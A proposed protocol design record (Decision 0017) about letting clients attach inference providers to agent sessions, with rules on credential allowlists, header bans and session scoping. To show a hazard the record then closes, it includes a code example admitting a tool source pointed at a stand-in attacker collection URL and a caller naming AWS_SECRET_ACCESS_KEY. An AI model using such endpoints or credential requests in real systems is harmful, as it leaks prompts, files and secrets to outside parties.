# Decision 0017: Provider Provisioning

Status: proposed
Date: 2026-09-17
Protocol: `open-agent-protocol` version `0.1`
Profile: `open-agent-protocol.agent-control-core`
Unit: `provider-attach` (claim term `+provider-attach`)
Extends: [Decision 0008](0008-tool-sources.md), whose attachment shape and
admission rules this reuses unchanged, and
[Decision 0014](0014-provider-descriptors.md), which defines the read direction
this writes into. Amends neither
Depends on: [Decision 0014](0014-provider-descriptors.md), which is proposed.
`ProviderDescriptor` does not exist in `protocol/` or `schema/v0.1/` today, so
this record cannot graduate before that one
Related: [Decision 0016](0016-model-provider-profile.md) defines the provider
boundary as its own profile. This record is not that profile. It is the
agent-control envelope by which a client asks an agent loop to use a provider,
whatever the loop speaks downward
Gated by: [Decision 0003](0003-staged-unit-graduation.md)
Design: [the composition draft](../drafts/composition.md), section "The shape
the missing row should take"

## Context

A client can say where its tools come from and cannot say where its inference
comes from. [The composition draft](../drafts/composition.md) sets the two side
by side: `session.open.request.tool_sources` carries kind, protocol and
endpoint for tools; the provider column has discovery (`models.list`, with
descriptors proposed in 0014) and per-run selection (`submit.model_id`) and
nothing at all in the provisioning row.

That asymmetry is not a missing convenience. A layer the client cannot provision
is a layer it cannot see past — it gets whatever inference the loop was
configured with, and the only way to change it is to reconfigure the loop, which
is the thing layering was supposed to stop being necessary.

Harnesses already take a provider as a session parameter. Decision 0014's
evidence section records the four cases and their standing; this record does not
restate them, because restating an evidence claim from memory of a grep is how
[Decision 0011](0011-control-layer-provided-tools.md) acquired a false context
paragraph.

## Decisions

### `session.open.request` gains an optional `providers[]`

A list of `ProviderAttachment`, beside `tool_sources` and admitted by the same
machinery:

```
{ "id", "display_name"?, "wire"?, "kind"?, "endpoint"?, "environment"? }
```

The members mean what `ProviderDescriptor`'s mean in Decision 0014, with one
addition and two deliberate absences.

The addition is `environment`, in the same bare-`NAME` allowlist form
`ToolSourceAttachment` carries. It is how a provider gets an API key without
the key travelling: the caller names the variable, the operator supplies the
value.

The absences are `command` and `args`. A tool source may name a process to
spawn; a provider is a destination and a wire, and there is no child to start.
Admitting them would create a second path by which a caller names a binary, and
the tool-source path already needs guarding.

An attachment is what a caller asks for and is judged at admission. A descriptor
is what an endpoint publishes and is fixed for a capability revision. The two
have the same members because they describe the same thing from opposite sides,
and they are different objects because one is a request and one is an
assertion.

### Admitted providers appear in the catalog

A provider admitted at open is published in `models.response.providers[]` for
that session, and the models it serves resolve to it through `provider_id`
exactly as a configured provider's do. A client that attached a provider and
then read the catalog sees one list, not two, and Decision 0014's
`unmatched_provider` rule binds the merged list.

Without this the client would have to remember what it attached in order to
interpret what it reads back, and the endpoint's own view of the session would
be unavailable to it — which is the failure Decision 0008 fixed for tools when
`session.open.response` began publishing attached sources beside configured
ones.

### Attachment is free only when the attached thing resolves against nothing

The symmetry with `tool_sources` carries an assumption that does not travel
with it, and the assumption is not the one it first looks like.

It looks like session-scope. Makai's maintainers report that their tools are
genuinely per-session — their multi-session host has no tool registry at all,
tool definitions arriving as data in the frames that start an agent and a turn —
while provider resolution is process-global: one provider protocol server per
process, named endpoints loaded from a config file at catalog build, base URLs
read from the environment, nothing in the resolution path taking a session id.

But session-scope is the symptom. The property underneath it is that **a tool
definition resolves against nothing.** It is self-contained data that travels
with the request, so attaching one asks the endpoint to hold it, not to find
anything. A provider must be resolved — against a registry for the wire format
and a catalog for the endpoint — and the endpoint built both before the session
existed.

Resolution alone is not the line, though, and stopping there flags something
obviously fine. A caller-supplied model identifier arrives per session and
resolves against exactly the same two pieces of pre-session state — a registry
for the wire, a catalog for the endpoint. Every OAP submit carries one.
`submit.model_id` has been free since Decision 0005 and should stay free.

What separates them is read from write. Naming an existing provider *reads*
shared state: two sessions naming the same one get the same answer, and neither
changes what the other sees. Attaching a provider *adds an entry* to it, and
that is what forces first-wins, clobber or refuse. Makai's maintainers point at
their own split as the check — provider lookup happens per request, while
registration happens once at startup and nowhere else outside tests.

So the predicate this record adopts, stated generally because it is not about
providers:

> **Does the attachment introduce or modify an entry in state the endpoint
> built before the session existed, rather than merely naming one?** Naming is
> free at any scope. Introducing is what needs a per-session view — and an
> endpoint that cannot give each session its own view must not advertise the
> unit.

**Two sessions attaching different endpoints under one provider id must not be
representable as one.** An endpoint whose provider resolution predates its
sessions has exactly three ways to merge a session-scoped attachment into a
process-scoped registry: the first attachment silently wins, the second
clobbers the first for every session, or the attachment is refused. The first
two are unobservable to a caller that did nothing wrong and are not reportable
in either direction — session B's prompts go to session A's endpoint, and
nothing on the wire says so. That is not a poor implementation of the feature;
it is a cross-session leak arriving through the feature meant to make provider
configuration visible. Only refusal is honest, so refusal is the rule: an
endpoint that cannot give a session its own provider view does not advertise
`action.providers.attach`, and refuses the open if one arrives.

Permanently refusing the unit is a conformant position. A wrong merge is not.
That puts the cost where it belongs: an endpoint with a process-global registry
is conformant as it stands, and a per-session overlay buys a capability rather
than paying off a debt.

The predicate earns its generality three times over. Tools resolve against
nothing, so they are free. Purely declarative attachments — a prompt fragment,
an output schema, sampling defaults — introduce nothing the endpoint must
resolve, so they are free too, and this is not a tax on attachments generally.
And it classifies the one gap this record leaves open: an attached MCP *source*
names a server the endpoint must connect to and hold, which is a new entry
rather than a lookup, so it sits on the provider side of the line rather than
the tool side. The pass-through arm below is the same class of hole one layer
out, not a milder version of it.

### `id` names a vendor endpoint, not a wire implementation

`ProviderAttachment.id` and `ProviderDescriptor.id` name a configured vendor
endpoint. `wire` names the request shape spoken to it. They are different
layers and an implementer will conflate them, because both get called "the
provider" in ordinary speech.

Makai keeps them apart structurally: their API registry holds wire-format
implementations, their catalog holds named vendor endpoints, and a model
reference carries both — `provider_id/api@model_id`. `providers[]` maps onto
the catalog, never onto the registry. An implementer who reads "provider" and
wires this to their wire-format layer gets something that mostly works until
two vendor endpoints share a request shape, at which point the ids collide and
the catalog stops resolving.

This is why Decision 0014 gives the descriptor both members instead of one, and
why `wire` is drawn from a closed set while `id` stays opaque and
endpoint-scoped.

### The unit is gated, whole-or-nothing, and fail-closed

`action.providers.attach`, disclosed for the `session_open` mode, joining
`action.tool_sources.attach` in the capability vocabulary. An endpoint that does
not advertise it refuses an open that carries `providers[]` with
`unsupported_feature`.

The list is admitted whole or refused whole, and a refusal names the entry at
fault. A partially provisioned session is a session whose model catalog means
something different from what the caller asked for, with nothing on the wire
saying so.

An adapter that does not implement the unit must refuse rather than ignore, the
way `adapter.RefuseUnadvertisedTools` does for control-owned tools at the same
point in `Open`. Decision 0008 states the reason and it is unchanged here: an
adapter that silently drops an attachment returns a session the caller cannot
distinguish from one that honoured it.

### `oap serve` accepts an id and closes the pass-through arm

The daemon accepts a provider attachment only as an **id naming operator
configuration**, plus an `environment` allowlist. Every other member is refused
when it contradicts the configured provider, and an id that names no configured
provider is refused outright.

That last clause is where this departs from `ResolveAttachments` rather than
inheriting it, and the departure is deliberate. Today a tool-source attachment
whose id is unconfigured and whose kind is not `process` is admitted carrying
its own `endpoint`. Verified by running against `906b2a1`, not read:

```
resolved, refusal := serve.ResolveAttachments(hub, []protocol.ToolSourceAttachment{{
    ID: "not-configured-anywhere", Kind: protocol.ToolSourceRemote,
    Endpoint: "https://attacker.example/collect",
}})
// refusal == nil; resolved[0].Endpoint == "https://attacker.example/collect"
```

For a remote tool source that arm is arguable: naming a remote MCP server is
close to the point of the feature. For a provider it is not arguable at all. A
control layer that can repoint an agent at an arbitrary inference endpoint can
read every prompt, every tool result and every file the agent has seen, and
the agent behaves normally while it happens. The daemon therefore has no
pass-through arm for providers, and the gap
[the composition draft](../drafts/composition.md) names in the tool-source path
is closed here for this unit rather than inherited from it.

An in-process embedder whose control layer *is* the operator may accept more.
That is what makes bring-your-own-key and per-session gateways expressible
without the daemon relaxing anything, and it is the same split Decision 0014
drew between protocol and deployment policy after an earlier version of that
record mistook one for the other.

### Credentials never travel, and the allowlist has two stages

`environment` carries bare `NAME` entries only. A literal `NAME=value` is
refused at the daemon, by `hasLiteralEnvironment`, before anything else is
looked at.

A bare name reaches the adapter unresolved — `mergeEnvironment` appends the
caller's names to the operator's already-resolved list without giving them
values — and the adapter resolves it against its *own* operator allowlist,
dropping any name that is not in it. Both halves verified by running against
`906b2a1`:

```
caller sends  environment: ["AWS_SECRET_ACCESS_KEY", "HOME"]
after merge   ["DOCS_TOKEN=operator-secret", "AWS_SECRET_ACCESS_KEY", "HOME"]
at the ACP adapter, with Environment: ["LISTED=operator-value"] configured:
caller sends  environment: ["LISTED", "AWS_SECRET_ACCESS_KEY"]
session/new   [{Name:LISTED Value:operator-value}]
```

So a caller cannot widen the allowlist by naming a variable the operator did not
configure: the name survives the daemon and dies at the adapter. The provider
attachment inherits this property and must not be given a shortcut around it —
in particular, no member of `ProviderAttachment` may carry a value that an
operator would otherwise have supplied.

### No caller-supplied headers, and no free-form passage to the upstream request

`ProviderAttachment` carries no `headers` member and no map that reaches the
provider request. This is a rule about the payload, not an omission that held
because nobody asked for one.

Makai's maintainers raised it against this record's draft, from their own
implementation: `headers` sits on both their per-provider `Model` and their
per-call `StreamOptions`, and `Authorization: Bearer sk-...` is a header. A
credential allowlist that governs a credential field does nothing when the
credential is not put in the credential field. On their side headers are
operator configuration and never caller-supplied, which is why it has never
bitten them; a caller-supplied form would open exactly the channel the previous
section closes.

The rule generalizes past headers: **any member that passes caller text through
to the upstream request is a credential channel**, whatever it is named. If a
later unit needs one, it allowlists names the way `environment` does and the
operator supplies values — it does not rely on no field being called
`api_key`.

A related correction from the same source, worth stating because it changes
what a refusal may assume: some providers need no credential at all. Makai
carries `allows_anonymous` on a provider for this. Absence of a credential is a
configuration, not an error state, and an endpoint must not infer that an
unauthenticated provider is a misconfigured one.

## Evidence

**This record is not yet gradable, and saying so is the point.** Under
[Decision 0015](0015-evidence-from-implementations-we-do-not-control.md) a unit
graduates on an implementation this project does not control. No pinned harness
accepts a caller-supplied provider destination: the four cases Decision 0014
records take the destination from operator configuration and never from a
client. What they establish is that the provider is a *session parameter* —
Hermes takes one on `session.create` — not that any of them would admit one
from the wire.

The reference adapter can execute the unit, and executing it there proves the
shape is implementable, which is step 1 of Decision 0003's gate and not step 3.

**This record's account of Makai's tree was checked by its maintainers against
source, on 2026-09-17**, after the first three drafts of this record had each
been corrected by them. The characterization verified covers every claim made
here: no tool registry in the multi-session host, tool definitions arriving as
data in the frames that start an agent and a turn, one provider protocol server
per process, named endpoints loaded at catalog build, base URLs from the
environment, no session id anywhere in the resolution path, and lookup per
request against registration only at startup. That raises those claims from
reported to checked. It does not make them step-3 evidence, because nothing in
that tree speaks this unit.

**The hazard is verified even though the feature is not.** The two runs above
are against merged code at `906b2a1`. They are why this record specifies a
daemon rule that differs from the one it otherwise inherits, rather than
discovering the difference after shipping.

**What would settle it.** An agent loop outside this repository that accepts a
provider attachment at open and routes inference to it. Makai is the expected
first case, for the reason [Decision 0016](0016-model-provider-profile.md)
gives — it is the only implementation of the provider boundary either side can
point at — and under Decision 0015 it stops counting as third-party evidence if
it becomes first-party.

## Consequences

The composition draft's provider column fills in, and "use this provider" and
"use this MCP server over stdio" become the same kind of request with the same
kind of refusal.

A client can attach a provider and read back one catalog that includes it, so
provisioning and discovery are two halves of one object rather than two
features that happen to share a noun.

`oap serve` grows a provider registry beside its tool-source registry, with the
same operator-configures-destinations rule and without the pass-through arm.

The tool-source pass-through gap becomes a named, reachable thing rather than a
sentence in a draft. This record does not close it for tool sources — that is
someone's decision about an accepted unit's deployment policy, and changing it
would refuse opens that are admitted today. What it does say is that the gap is
the same class as the provider one under the predicate above, and not a milder
version of it: a remote source is a thing the endpoint resolves and holds, not
a definition that travels with the call.

## What this decision does not admit

Credentials on the wire, in any form, under any capability key, for any
deployment. Not a token, not a header, not an environment value. A name the
operator resolves is the only form a secret takes here, and that is not a
daemon policy this record could relax for an embedder — it is the shape of the
payload.

`command` or `args` on a provider attachment. There is no child process at this
boundary, and a second path to naming a binary is not worth a symmetry.

`headers`, or any other free-form passage to the upstream request, for the
reason the headers section gives.

Provider selection as a run control. Decision 0014 refuses it and the reason
holds: `model_id` already selects, a model resolves to its provider through the
catalog, and a second selector would let one submit name a model and a provider
that disagree.

Mutating a session's providers after open. Attachment is admission, the way it
is for tool sources. A mid-session provider change would move the catalog under
a revision that is fixed for it.

A process-global merge dressed as a session-scoped attachment. An endpoint that
cannot scope a provider to one session refuses the unit; it does not admit the
attachment and apply it everywhere.

`auth_status`, or anything else that moves without the descriptor moving.
Decision 0014 separated provider identity from provider usability and this
record does not rejoin them. Whether usability belongs in
[the provider profile](0016-model-provider-profile.md) rather than here is open.

A claim that the daemon rule here is the right one for tool sources too. It
may be. This record does not decide it, because that unit is accepted and has
callers.
